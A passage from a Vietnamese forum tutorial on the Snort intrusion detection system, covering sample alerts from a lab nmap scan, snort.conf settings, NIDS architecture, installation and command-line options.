sẽ xuất hiện các bảng tóm tắt:<br/><br/><br/><br/> ===============================================================================<br/><br/> Snort analyzed 3210 out of 3807 packets, dropping 597(15.682%) packets<br/><br/><br/> Breakdown by protocol: Action Stats:<br/><br/> TCP: 2602 (68.348%) ALERTS: 6<br/><br/> UDP: 2 (0.053%) LOGGED: 6<br/><br/> ICMP: 8 (0.210%) PASSED: 0<br/><br/> ARP: 0 (0.000%)<br/><br/> EAPOL: 0 (0.000%)<br/><br/> IPv6: 0 (0.000%)<br/><br/> IPX: 0 (0.000%)<br/><br/> OTHER: 0 (0.000%)<br/><br/> DISCARD: 0 (0.000%)<br/><br/> ===============================================================================<br/><br/> Wireless Stats:<br/><br/> Breakdown by type:<br/><br/> Management Packets: 0 (0.000%)<br/><br/> Control Packets: 0 (0.000%)<br/><br/> Data Packets: 0 (0.000%)<br/><br/> ===============================================================================<br/><br/> Fragmentation Stats:<br/><br/> Fragmented IP Packets: 0 (0.000%)<br/><br/> Fragment Trackers: 0<br/><br/> Rebuilt IP Packets: 0<br/><br/> Frag elements used: 0<br/><br/> Discarded(incomplete): 0<br/><br/> Discarded(timeout): 0<br/><br/> Frag2 memory faults: 0<br/><br/> ===============================================================================<br/><br/> TCP Stream Reassembly Stats:<br/><br/> TCP Packets Used: 2602 (68.348%)<br/><br/> Stream Trackers: 1559<br/><br/> Stream flushes: 0<br/><br/> Segments used: 0<br/><br/> Stream4 Memory Faults: 0<br/><br/> ===============================================================================<br/><br/> Final Flow Statistics<br/><br/> ,----[ FLOWCACHE STATS ]----------<br/><br/> Memcap: 10485760 Overhead Bytes 16400 used(%2.287951)/blocks (239909/1564) Overhead<br/><br/> blocks: 1 Could Hold: (73326)<br/><br/> IPV4 count: 1563 frees: 0 low_time: 1080162455, high_time: 1080162458, diff: 0h:00:<br/><br/> 03s<br/><br/> finds: 2612 reversed: 1022(%39.127106)<br/><br/> find_sucess: 1049 find_fail: 1563 percent_success: (%40.160796) new_flows: 1563<br/><br/> Protocol: 1 (%0.306279) finds: 8 reversed: 3(%37.500000)<br/><br/> find_sucess: 5 find_fail: 3 percent_success: (%62.500000) new_flows: 3<br/><br/> Protocol: 6 (%99.617152) finds: 2602 reversed: 1018(%39.123751)<br/><br/> find_sucess: 1043 find_fail: 1559 percent_success: (%40.084550) new_flows: 1559<br/><br/> Protocol: 17 (%0.076570) finds: 2 reversed: 1(%50.000000)<br/><br/> find_sucess: 1 find_fail: 1 percent_success: (%50.000000) new_flows: 1<br/><br/> Snort exiting<br/><br/><br/><br/><br/> Bây giờ đã có 1 file báo động trong thư mục /var/log/Snort. File sẽ bao gồm các báo động từ Snort khi đang chạy ( trong bài này có sử dụng nmap SYN scan để cho Snort báo động )<br/><br/><br/> [**] [1:469:1] ICMP PING NMAP [**]<br/><br/> [Classification: Attempted Information Leak] [Priority: 2]<br/><br/> 03/24-15:07:35.187504 192.168.1.2 -&gt; 192.168.1.105<br/><br/> ICMP TTL:51 TOS:0x0 ID:23210 IpLen:20 DgmLen:28<br/><br/> Type:8 Code:0 ID:1290 Seq:0 ECHO<br/><br/> [Xref =&gt;<span class="link"> http://www.whitehats.com/info/IDS162]</span><br/><br/><br/><br/> [**] [1:618:5] SCAN Squid Proxy attempt [**]<br/><br/> [Classification: Attempted Information Leak] [Priority: 2]<br/><br/> 03/24-15:07:35.583826 192.168.1.2:49641 -&gt; 192.168.1.105:3128<br/><br/> TCP TTL:44 TOS:0x0 ID:56810 IpLen:20 DgmLen:40<br/><br/> ******S* Seq: 0x4EB5A7C6 Ack: 0x0 Win: 0x400 TcpLen: 20<br/><br/><br/><br/> [**] [1:1421:3] SNMP AgentX/tcp request [**]<br/><br/> [Classification: Attempted Information Leak] [Priority: 2]<br/><br/> 03/24-15:07:35.589463 192.168.1.2:49641 -&gt; 192.168.1.105:705<br/><br/> TCP TTL:44 TOS:0x0 ID:54050 IpLen:20 DgmLen:40<br/><br/> ******S* Seq: 0x4EB5A7C6 Ack: 0x0 Win: 0x400 TcpLen: 20<br/><br/> [Xref =&gt;<span class="link"> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0013]</span>[Xref =&gt;<span class="link"> http://</span><br/><br/> cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0012]<br/><br/><br/><br/> [**] [1:615:5] SCAN SOCKS Proxy attempt [**]<br/><br/> [Classification: Attempted Information Leak] [Priority: 2]<br/><br/> 03/24-15:07:35.674332 192.168.1.2:49641 -&gt; 192.168.1.105:1080<br/><br/> TCP TTL:44 TOS:0x0 ID:9794 IpLen:20 DgmLen:40<br/><br/> ******S* Seq: 0x4EB5A7C6 Ack: 0x0 Win: 0x400 TcpLen: 20<br/><br/> [Xref =&gt;<span class="link"> http://help.undernet.org/proxyscan/]</span><br/><br/><br/><br/> [**] [1:1420:3] SNMP trap tcp [**]<br/><br/> [Classification: Attempted Information Leak] [Priority: 2]<br/><br/> 03/24-15:07:35.696925 192.168.1.2:49641 -&gt; 192.168.1.105:162<br/><br/> TCP TTL:44 TOS:0x0 ID:41259 IpLen:20 DgmLen:40<br/><br/> ******S* Seq: 0x4EB5A7C6 Ack: 0x0 Win: 0x400 TcpLen: 20<br/><br/> [Xref =&gt;<span class="link"> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0013]</span>[Xref =&gt;<span class="link"> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0012]</span><br/><br/><br/><br/> [**] [1:1418:3] SNMP request tcp [**]<br/><br/> [Classification: Attempted Information Leak] [Priority: 2]<br/><br/> 03/24-15:07:35.827022 192.168.1.2:49641 -&gt; 192.168.1.105:161<br/><br/> TCP TTL:44 TOS:0x0 ID:37753 IpLen:20 DgmLen:40<br/><br/> ******S* Seq: 0x4EB5A7C6 Ack: 0x0 Win: 0x400 TcpLen: 20<br/><br/> [Xref =&gt;<span class="link"> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0013]</span>[Xref =&gt;<span class="link"> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0012]</span><br/><br/><br/><br/> Ví dụ phân tích một báo động của Snort<br/><br/> Đây là tên của báo động:<br/><br/> [**] [1:1418:3] SNMP request tcp [**]<br/><br/> Snort sẽ chia ra nhiều lớp cho từng loại báo động , ví dụ cái này là thuộc dang đang cố gắng đánh lừa thông tin “Attempted Information Leak” và mức độ ưu tiên của từng báo động<br/><br/><br/> [Classification: Attempted Information Leak] [Priority: 2]<br/><br/> Đây là phần header và thông tin của packet là nguyên nhân gây ra báo đông:<br/><br/><br/> 03/24-15:07:35.827022 192.168.1.2:49641 -&gt; 192.168.1.105:161<br/><br/> TCP TTL:44 TOS:0x0 ID:37753 IpLen:20 DgmLen:40<br/><br/> ******S* Seq: 0x4EB5A7C6 Ack: 0x0 Win: 0x400 TcpLen: 20<br/><br/><br/><br/> Snort sẽ báo động bao gồm các đường dẫn tới mô tả các rules gây ra báo động<br/><br/> [Xref =&gt;<span class="link"> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0013]</span>[Xref =&gt;<span class="link"> http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2002-0012]</span><br/><br/> link này rất hữu ích khi xem xét lại có bị báo động lỗi hay không.<br/><br/><br/> <b><font color='violet'>2.4. File Snort.conf</font></b><br/><br/> File Snort.conf điều khiển mọi thứ mà Snort thấy được, làm cách nào nó có thể chống lại các cuộc tấn công, những rules nào được sử dụng khi thấy nghi ngờ, và làm cách nào nó có thể phát hiện ra được những dấu hiệu nguy hiểm tìm tàng mặc dù nó không có các tín hiệu nhận dạng cụ thể để so sánh. Để hiểu và cấu hình nó thành công khi phát triển Snort thành 1 công cụ IDS thật sự. Tôi sẽ trình bày cụ thể những kinh nghiệm hiểu biết về Snort sau đây. Để tìm hiểu nó 1 cách nhanh nhất và dễ dàng nên mở sẵn nó ra trên máy tính hoặc in nó ra giấy theo dõi cho dễ dàng.<br/> Ví dụ file Snort.conf mở ra bằng gedit<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136454922_thumb.jpg' border="0" /></div><br/><br/> File conf được chia ra thành nhiều đoạn và có chú thích rất rõ ràng cho từng đoạn, những nội dung chính của nó gồm:<br/><br/> • Thiết lập mạng và cấu hình các biến<br/> • Cấu hình phần giải mã (decoder) 1và phát hiện<br/> • Cấu hình tiền xử lý (preprocessor)<br/> • Cấu hình phần output<br/> • File được trỏ tới<br/><br/> 2.4.1 Thiết lập mạng và cấu hình các biến<br/><br/> Các biến trong file conf được tạo ra thường để dễ dàng hơn trong việc theo dõi các địa chỉ IP, hoặc các port TCP,UDP được chỉ định mà nó đang lắng nghe.<br/> Mặc định các biến thường để giá trị là any chỉ tất cả các địa chỉ IP mà nó nhận được, nó cũng có thể là nguyên nhân gây ra nhiều báo động sai.<br/><br/> Để chị định 1 địa chỉ ip, đơn gian chỉ làm theo cách sau:<br/><br/> Var HOME_NET 192.168.1.1<br/><br/> Hoặc khi muốn chỉ định nhiều địa chỉ cùng lúc, phải có dấu ngoặc vuông để chỉ định cho cả nhóm:<br/><br/> Var HOME_NET [192.168.1.1,192.168.14.1,10.0.0.2]<br/><br/> Ta cũng có cách khác để chỉ định luôn cả mạng:<br/><br/> Var HOME_NET 10.10.10.0/24<br/><br/> Hoặc cũng có thể gộp cả 2 cách trên vào chung 1 nhóm:<br/><br/> Var HOME_NET [192.168.1.1,10.10.10.0/24,172.168.1.5/16,187.1.1.1/19]<br/><br/> Nếu muốn chỉ định không dùng các ip này ngoại trừ … thì dùng thêm dấu “than” ! nghĩa là NOT<br/><br/> Var EXTERNAL_NET !$HOME_NET<br/><br/> Để chỉ định cho các port cũng làm tương tự ví dụng<br/><br/> Var ORACLE_PORTS 1521<br/><br/> Hoặc các port không phải là port 80<br/><br/> Var SHELLCODE_PORTS !80<br/><br/> 2.4.1.1 Các biến mặc định trong Snort.conf<br/><br/> HOME_NET : chỉ định địa chỉ mạng của mình đang bảo vệ<br/> EXTERNAL_NET: các mạng bên ngoài.<br/><br/> Các biến để chỉ định các server đang chạy các service phục vụ cho hệ thống<br/><br/> DNS_SERVERS<br/> SMTP_SERVERS<br/> HTTP_SERVERS<br/> SQL_SERVERS<br/> TELNET_SERVERS<br/> SNMP_SERVERS<br/> ……<br/><br/> Các port mặc định các biến khác:<br/><br/> HTTP_PORTS<br/> SHELLCODE_PORTS<br/> ORACLE_PORTS<br/> AIM_SERVERS<br/> RULES_PATH<br/><br/> 2.4.2 Cấu hình phần giải mã ( decoder ) và phát hiện ( detection )<br/><br/> Snort sẽ giải mã cấu trúc các packet và so sánh cấu trúc theo những dấu hiệu đã được trang bị. Nếu packet có kích thước lạ, nhìêu cấu hình lạ không bình thường, Snort sẽ báo động. Nếu không báo động thì sẽ có 1 luợng lớn lỗi báo động sai. Ta có thể tắt chức năng này. Mặc định tất cả báo động đều bật. Để tắt 1 loại báo động cụ thể nào đó, ta nên để dấu thăng # vào trước dòng lệnh thành dòng comment ghi chú<br/><br/> # config disable_decode_alerts<br/><br/> # config disable_tcpopt_experimental_alerts<br/><br/> # config disable_tcpopt_obsolete_alerts<br/><br/> # config disable_tcpopt_ttcp_alerts<br/><br/> # config disable_tcpopt_alerts<br/><br/> # config disable_ipopt_alerts<br/><br/><br/> Mô hình làm việc của decode<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136455089_thumb.jpg' border="0" /></div><br/><br/> Mô hình detect các packet<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136455127_thumb.jpg' border="0" /></div><br/><br/> Ta cũng có thể thêm vào nhiều dòng lênh của Snort trong phần này của file Snort.conf<br/><br/><br/> Cấu Hình Option Của Snort.conf<br/><br/><br/><br/> Option ----------- Mô tả<br/><br/> config order: [pass, alert, log, activation, or dynamic] ----------- Thay đổi các giá trị điều khỉên của rules<br/> config alertfile: alerts ----------- Thiết lập output của file báo động<br/> config decode_arp ----------- Bật chức năng arp decoding (Snort -a).<br/> config dump_chars_only ----------- Bật chức năng character dumps (Snort -C).<br/> config dump_payload ----------- Hiện thông tin lớp application(Snort -d).<br/> config decode_data_link ----------- giải mã Layer2 headers (Snort -e).<br/> config bpf_file: filters.bpf ----------- Chỉ định dùng bộ lọc BPF (Snort -F).<br/> config set_gid: 30 ----------- Thay đổi GID đến GID khác (Snort -g).<br/> config daemon -----------Chạy Snort ở chế độ daemon (Snort -D).<br/> config interface: &lt;interface name&gt; ----------- Thiết lập interface (Snort -i).<br/> config alert_with_interface_name ----------- Chỉ định interface cần báo động (Snort -I).<br/> config logdir: /var/log/Snort ----------- Thiết lập lại thư mục log (Snort -l).<br/> config umask: &lt;umask&gt; ----------- Thiết lập umask khi chạy (Snort -m).<br/> config pkt_count: N ----------- Thoát ra sau N packets (Snort -n).<br/> config nolog ----------- Tăt chế độ log (Snort -N).<br/> config obfuscate ----------- Ẩn địa chỉ IP (Snort -O).<br/> config no_promisc ----------- Tắt chế độ cho chạy lẫn lộn (Snort -p).<br/> config quiet ----------- Tắt banner và report trạng thái (Snort -q).<br/> config chroot: /home/Snort ----------- Thay đổi lại thư mục root (Snort-T).<br/> config checksum_mode : all ----------- Các loại packet dùng để tính toán lại checksums: none, noip, notcp, noicmp, noudp, or all.<br/> config set_uid: &lt;id&gt; ----------- Thay đổi UID ra uid mới (Snort-u).<br/> config utc ----------- Sử dụng UTC thay vì dùng thời gian máy local gán cho timestamps (Snort -U).<br/> config verbose ----------- Sử dụng chế độ xem chi tiết (Snort -v.)<br/> config dump_payload_verbose ----------- Hiển thị những packet "thô" bắt đầu ở lớp linkdata (Snort-X ).<br/> config show_year ----------- Hiển thị timestamps năm (Snort-y).<br/><br/> channhua - HVA</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.html">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/167.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/167/569.html#569,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><font color='violet'><b>Phát hiện xâm nhập - Detecting Intrusions</b></font><br/><br/> Phát hiện xâm nhập đơn giản là phát hiện những tín hiệu , biểu hiện của người xâm nhập trước khi thiệt hại xảy ra như các services bị denied hay mất dữ liệu và chúng ta có thể ngăn chặn thông qua các kĩ thuật khác nhau. Config những log của hệ thống mà lưu giữ những thông tin về services, user hay data. Người quản trị có thể phát hiện những thông tin lý thú trong các log này, nó thực sự quan trọng khi coi các log và là bước đầu tiên cơ bản nhất để phát hiện xâm nhập và system log đã cho thấy giá trị thực sự của nó<br/><br/> Kế tiếp của sự phát hiện xâm nhập là dùng các tools tự động thường được xem là 1 HIDS ( host-based intrusion detection).HIDS tools bao gồm các software antivirus, persional firewall, NIDS đựơc cài đặt trên các host và nhiều software bảo vệ chống tràn bộ đệm hoặc sự cố gắng bẻ gãy policy của attacker<br/><br/> Và cuối cùng là NIDS<br/><br/> Ví dụ về các HIDS<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136263299_thumb.jpg' border="0" /></div><br/><br/> <font color='violet'>NIDS - Network Instrusion Detection System là gì ? </font><br/> Trên cấp độ căn bản, phát hiện xâm nhập được xem như là 1 tiến trình được quyết định khi 1 người không xác chứng thực đang cố gắng để bẻ gãy hệ thống của bạn. Phát hiện những kết nối không hợp lệ là bước khởi đầu tốt nhưng không phải là tẩt cả câu chuyện. Những hệ thống như Snort có thể phát hiện những sự cố gắng đang login vào hệ thống, truy cập vào những vùng share không được bảo vệ và nhiều điều khác nữa, nhưng nhiều loại xâm nhập không rõ ràng để chúng ta có thể phát hiện dễ dàng như là các các cuộc tấn công dùng phương pháp DoS tuy nó không thiệt hại nhiều chỉ chiếm bandwidth và Cpu, dung lượng ổ cứng trên IDS nhưng nó cũng là tín hiệu để có biện pháp phòng chống hữu hiệu<br/><br/> NIDS như Snort có thể scan network traffic để phát hiện những tín hiệu nghi ngờ và các gói dữ liệu xấu, và bạn cũng có thể dùng những tools khác như Tcpdump hay ethereal để để xem các luồng thông tin trên các subnet khác nhau, từ những tools này chúng ta có thể sniff các packet để phân tích và debug hệ thống<br/><br/> Một IDS sẽ kiểm tra tất cả các packet đi qua hệ thống và quyết định packet có vấn đề khả nghi. Bằng cách nào nó có thể biết packet đó khả nghi ? như Snort sẽ có các danh sách các loại packet được mô tả tỷ mỉ giúp hệ thống dựa vào đó mà phán quyết packet nào khả nghi ví dụ như nếu bạn nhận được 1 gói ICMP có kích thước lớn hơn bình thường và bạn có thể đoán được 1 người nào đó đang cố gắng ping of death vào mạng của bạn hoặc như bạn nhận đuợc các packet đựơc phân mảnh ra cực kì ngắn bạn cũng có thể suy ra rằng ai đó đang dùng kĩ thuật tấn công phản hồi làm đảo lộn các gói để lừa firewall thường đuợc gọi là fragmentation attack. Snort cũng như các IDS khác đuợc trang bị hàng ngàn tình huống để nhận dạng tấn công và đuợc cập nhật thường xuyên trên Snort website. Snort và các IDS khác thực sự quan trọng và là lựa chọn hàng đầu để phòng thủ, nếu một attacker xâm nhập và Server của bạn, bạn có thể phát hiện ở system log, mặc dù nhiều attacker tinh ranh xóa đi log của bạn<br/><br/> Ví dụ đây là mô hình của NIDS<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136263853_thumb.jpg' border="0" /></div><br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136263923_thumb.jpg' border="0" /></div><br/><br/> Trong đó:<br/><br/> - IDS sensor: Giám sát các traffic ở các segment / zone, gửi dữ liệu về centralize database server<br/> - Centralize database server: nơi tập trung các dữ liệu lấy từ sensor vào database (mysql chẳng hạn)<br/> - User interface: admin dùng giao diện web UI để giám sát<br/><br/> Và đây là các module của nó ở mức luận lý<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136263980_thumb.jpg' border="0" /></div><br/><br/> Giải thích cụ thể hơn 1 chút:<br/><br/> Gói tin bị capture từ sensor - host system or network sniffer (có thể là ở cấp độ host hoặc là cấp độ mạng) sẽ được chuyển qua pre-processing<br/> Pre-processing: gồm bộ phận decoder và preprocess:<br/><br/> - Decoder: đọc packet, nhận biết các trường trong packet<br/> - Preprocess: sắp xếp hoặc modify lại packet trước khi đi vào detection engine. Một số module này có khả năng phát hiện các packet dị thường trong header và sinh ra alert. Ngoài ra, nó có thể tái định dạng gói tin (defragment), sắp xếp lại chuỗi.<br/><br/> Detection engine: xảy ra quá trình phân tích packet: so sánh mẫu (signature matching) hoặc phân tích các dị thường trong packet (statictical analysis) để đưa ra output (alert manager) quyết định.<br/><br/> Knowledge base: database signature.<br/><br/> Long-term storage: nơi chứa các phát hiện dị thường của packet (không được định nghĩa trước)<br/><br/> Response manager: thực thi đáp ứng của alert manager như: ghi log, popup....<br/> GUI: giao diện đồ họa tương tác.<br/> Nhìn vào các sơ đồ trên ta có thể hình dung được phần nào về hệ thống của IDS, IDS can thiệp vào phần payload của các packet sâu hơn là các firewall, hình minh hoạ sau giúp ta phần biệt firewall và IDS dễ dàng hơn, rất dễ hiểu phần đầu là việc của firewall còn phần sau IDS làm tiếp việc kiểm tra của nó<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136264064_thumb.jpg' border="0" /></div><br/><br/> <font color='violet'><b>Tại sao Snort là một NIDS ?</b></font><br/><br/> Snort được coi như là NIDS mang lại nhiều lợi ích và là 1 NIDS mạnh mẽ phù hợp cho nhiều công ty vì nhiều lý do<br/><br/> Giá cả<br/><br/> Là một software mã nguồn mở và tất nhiên là free nhưng dễ dùng đựơc đóng gói thành nhiều sản phẩm phù hợp cho từng doanh nghiệp. Snort đuợc phát triển do công ty Soucefire điều hành bởi Martin Roesch. Hiện tại công ty Check point đã mua lại Soucefire với giá 225 triệu USD<br/><br/> Ổn định, Nhanh, Mạnh mẽ<br/><br/> Ngay từ đầu đây là mục đích chính để các nhà phát triển Snort luôn luôn giữ nó nhỏ gọn, nhanh, và trong sáng dễ dùng, không chiếm dụng nhiều đường truyền.<br/><br/> Tính năng tiền xử lý<br/><br/> Dùng để xử lý trước các message trong network ở thời gian thực tăng khả năng nhận dạng các packet nghi ngờ, tăng khả năng nhận diện attacker dùng các kĩ thuật tấn công nhằm đánh lạc hướng IDS<br/><br/> Tính Uyển Chuyển<br/><br/> Có thể dễ dàng thiết lập những rules trên những mode khác nhau phù hợp với thực trạng của công ty. Có thể dùng các tools để quản lý tập trung như ACID hay SnortCenter. Nhiều Scripts có thể plug-ins để mở rộng chức năng Snort có thể tạo những Access Control List tự động trên các thiết bị Cisco routers là 1 ví dụ điển hình<br/><br/> Được Support mạnh mẽ<br/><br/> Nhiều công ty thường xuyên test và kiểm tra các lỗ hổng của Snort đưa ra nhiều biện pháp khắc phục như CERT và SANS. Là sản phẩm nguồn mở nên được support rất nhiều bởi cộng đồng người sử dụng trên internet và các thông báo sẽ gửi đến từng người sử dụng qua mail nếu đăng kí và quan tâm đến Snort.<br/><br/> <font color='red'>TÀI LIỆU THAM KHẢO: SNORT COOKBOOK---OREILLY, SNORT INSTRUSION DETECTION 2.0--- SYNGRESS<br/> Bài viết sử dụng 1 số hình ảnh của omicron trong bài IDS/IDP vs firewall</font><br/><br/><br/> <b><font color='violet'>::: Phần 2 Cài Đặt Và Cấu Hình Snort:::</font></b><br/><br/> Trong phần này em sẽ trình bày các kĩ thuật thường dùng để bắt các packet và phân tích nội dung của chúng, các kinh nghiệm cài đặt và sử dụng. Em sẽ bắt đầu với cách sử dụng Snort như là Sniffer, Packet logger và cuối cùng là sử dụng Snort thực sự là NIDS<br/><br/> 2.1.Vài dòng về Snort<br/><br/> Ngày nay Snort có lẽ là sản phẩn IDS mã nguồn mở nổi tiếng nhất. Snort đuợc thiết kế dùng command line và nó có thể tích hợp chung với các sản phẩm khác và được dùng trên nhiều platforms khác nhau .<br/> Snort lần đầu tiên được phát triển năm 1998 lúc đó chức năng chính của nó là sniff các packet và đến nay nó phát triển vượt bậc với nhiều tính năng mạnh như đã biết. Hàng tuần Snort được download bởi hàng ngàn người và các nhà phát triển.Hiện nay nó được sử dụng như là IDS từ người dùng nhỏ đến các công ty lớn trên toàn thế giới trên nhiều platform khác nhau như Windows,FreeBSD,Linux,Solaris..<br/><br/> 2.2.Cài Đặt Snort<br/><br/> Chúng ta có thể cài đặt Snort từ Souce code hay là các gói RPM .Theo kinh nghiệm nên download source code và sau đó biên dịch để cài đặt hơn là dùng các gói binary có sẵn. Ta có thể config Snort kết hợp với MySQL. Hiện tại phiên bản mới nhất của Snort là 2.4.3 ngày 18/10/05 và khuyên nên dùng bản này trước đó ngày 6/10/05 CERT và SANS đã phát hiện lỗ hổng của Snort trong phần tiền xử lý Back Orifice.<br/><br/> 2.2.1Cài đặt từ Source code<br/><br/> Cài Snort khá dễ dàng, có nhiều tuỳ chọn phù hợp với nhu cầu ngừơi dùng; phần quan trọng nhất của Snort là kết hợp với nhiều database để lưu trữ. Download và giải nén Snort từ địa chỉ<span class="link"> http://www.Snort.org</span> . tôi thường cài đặt vào thư mục /usr/local/src bạn có thể sử dụng các lệnh sau để cài đặt<br/><br/> $ tar -xvft Snort-2.4.3.tar.gz<br/> $ cd Snort-2.4.3<br/> $ ./ configure<br/> $ make<br/> $ make install<br/><br/> Nó sẽ cài vào thư mục /usr/local/bin, mọi user có thể chạy nó. Nếu nó không chạy lệnh configure sẽ thông báo cho bạn biết. Hầu hết các trường hợp đều do 2 thư viện libpcap và PCRE ( pert-compatible regular Expression ) có thể download libpcap ở<span class="link"> http://www.tcpdump.org</span> và PCRE ở<span class="link"> http://www.pcre.org</span><br/><br/> 2.2.2 Cài đặt trên windows<br/><br/> Nếu muốn sử dụng Snort trên Windows bạn phải download thư viện winpcap từ địa chỉ<span class="link"> http://winpcap.polito.it.</span> Sau khi cài đặt winpcap rồi ta sẽ download bản cho windows ỏ<span class="link"> http://www.Snort.org/dl/binaries/win32.</span> Snort sẽ chạy với các dòng lệnh trên windows<br/> Một phiên bản khác có thể download từ địa chỉ<span class="link"> http://winSnort.com</span> được quản lý bởi Michael E.Steele và tất nhiên cũng free. Bản dùng cho windows làm việc tốt với cơ sở dữ liệu Microsoft SQL server và cũng có rất nhiều tài liệu về Snort trên website này rất bổ ích.<br/> Nhiều cuộc thảo luận dài diễn ra bàn luận về các hệ điều hành dùng Snort cái nào nhanh nhất. Tổng hợp từ nhiều nguồn tin từ các người dùng bằng cách đo điểm benchmarks chỉ ra rằng bản dùng cho windows nhanh hơn trên Linux và BSD<br/><br/> Các option trong câu lệnh của Snort<br/><br/> Các option này cũng được mô tả rất kĩ trong file config của Snort ,nếu chỉ muốn thử và tìm hiểu thì ta nên dùng các command line còn nếu muốn lưu giữ luôn trong file lúc setting nên vào config file<br/><br/> -A altert-mode<br/><br/> Nhiều mode được hỗ trợ ở đây như : fast , full, none, unsock<br/> -b<br/><br/> Log packet dạng tcpdump. file với format dạng tcmdump sẽ nhỏ hơn và là phương pháp tốt nhất khi cần lưu trữ với số luợng lớn log data và packet. dĩ nhiên nhỏ sẽ nhanh hơn và là sự lựa chọn trên các mạng tốc độ cao<br/><br/> -B address-conversion-mask<br/><br/> Giúp ẩn địa chỉ thực sự của internal network trong binary logs<br/><br/> -c config-file<br/><br/> Chỉ định conifg file nào muốn sử dụng, cần thiết khi Snort chạy ở mode NIDS<br/><br/> -C<br/><br/> In ra những kí tự tìm thấy trong packet payload, có thể hiển thị ở dạng hex<br/><br/> -d<br/><br/> Hiển thị dữ liệu ở tầng application khi dùng chế độ hiển thị đầy đủ hoặc trong packet logging mode<br/><br/> -D<br/><br/> Chạy Snort ở mode daemon. Daemon mode cần thiết khi ta cần chạy Snort tự động mỗi khi startup và sẽ hiển thị trong event khi ta khởi động, không có message nào được hiển thị trong console khi chạy ở mode này<br/><br/> -e<br/><br/> Hiển thị hoặc log các lớp liên kết paket headers. thường dùng khi capture packet khi chạy Snort ở chế độ Sniffing<br/><br/> -F bpf-file<br/><br/> Đọc Berkeley Packet Filters (BPF) từ bpf file.<br/><br/> -g group<br/><br/> Thay đổi group ID hoặc GID mặc định. Thường dùng khi ta muốn Snort chỉ cho dùng bởi những group đặc biệt mục đích để security hơn<br/><br/> -h home-net<br/><br/> Thiết lập "home network" chỉ định địa chỉ trong định dạng CIDR. Thường sử dụng để tạo biến HOME_NET trong file config<br/><br/> -i interface<br/><br/> Chỉ định interface nào Snort sẽ lắng nghe<br/><br/> -I<br/> Trong thông báo, hiển thị interface nào mỗi packet khi packet đến nếu ta có nhiều interface cùng lúc sử dụng nhìêu sensor và các sensor gửi các packet đến database quản lý cùng 1 lúc<br/><br/> -k checksum-mode<br/><br/> Điều khiển các packet checksums Snort. Nhiều giá trị checksum mode bao gồm all,noip,notcp,noudp,noicmp,none<br/><br/> -l logging-directory<br/><br/> Chỉ định thư mục để log các alter. Mặc định thư mục log là /var/log/Snort, nhưng mặc định chỉ sử dụng khi Snort chạy ở -A mode<br/><br/> -L binary-log-file<br/><br/> Thiết lập filename của file binary, mặc định sẽ là thời gian thêm vào trước chữ Snort.log được lưu trong log<br/><br/> -m umask<br/><br/> Thiết lập chế độ tạo mặt nạ file, đơn giản chỉ là ngăn chặn xem log file trong khi đang capture packet, tránh hacker xoá log<br/><br/> -n packet-count<br/><br/> Đếm số luợng packet đang tồn tại. thường dùng khi muốn capture một traffic ở mạng nhỏ trong thời gian ngắn<br/><br/> -N<br/><br/> Tắt packet logging nhưng chế độ alert vẫn hoạt động và chỉ hiển thị trên màn hình console. thường dùng để test những file cấu hình mới<br/><br/> -o<br/> Thay đổi thứ tự các rules đựoc áp đặt đến packet. Thay vì các rules áp đặt theo dạng chuẩn alert  pass  Log, ta có thể áp đặt lại Pass  Alert  Log. Khuyên dùng đối với người dùng chạy SnortCenter hoặc các web interfaces khác. Option này thường sử dụng khi chắc chắn rằng nhựng pass rules sẽ applied trước những detection rules.<br/><br/> -O<br/> Khi ở mode ASCII, nó sẽ thay thế địa chỉ ip hiển thị trên màn hình hoặc logfile với dạng”xxx.xxx.xxx.xxx”. nếu home-net đựoc set ở -h , chỉ có ip của home-net được hiển thị còn lại sẽ được thay thế. Sử dụng khi capture nhưng packet dùng để làm mẫu và share với mọi người trong các cuộc thảo luận ỏ các group hoặc qua mailing list<br/><br/> -p<br/><br/> Tắt chế độ sniff hỗn tạp, chỉ dùng để bảo vệ 1 host duy nhất.<br/><br/> -P snap-length<br/><br/> Thiết lập chiều dài tối đa cho các packet capture.Thiết lập để có thể bắt hết các packet, nếu thiết lập chiều dài quá ngắn có thể không coi hết được nội dung của packet khi cần thiết<br/><br/> -q<br/><br/> Không hiển thi banner hay những thông tin khi khởi động<br/><br/> -r tcpdump-file<br/><br/> Sử dụng option này khi dùng với file định dạng tcpdump<br/><br/> -s<br/><br/> Gửi alert message đến syslog server. Có thể gửi ở local hay remote server<br/><br/> -S variable=value<br/><br/> Gán giá trị cho 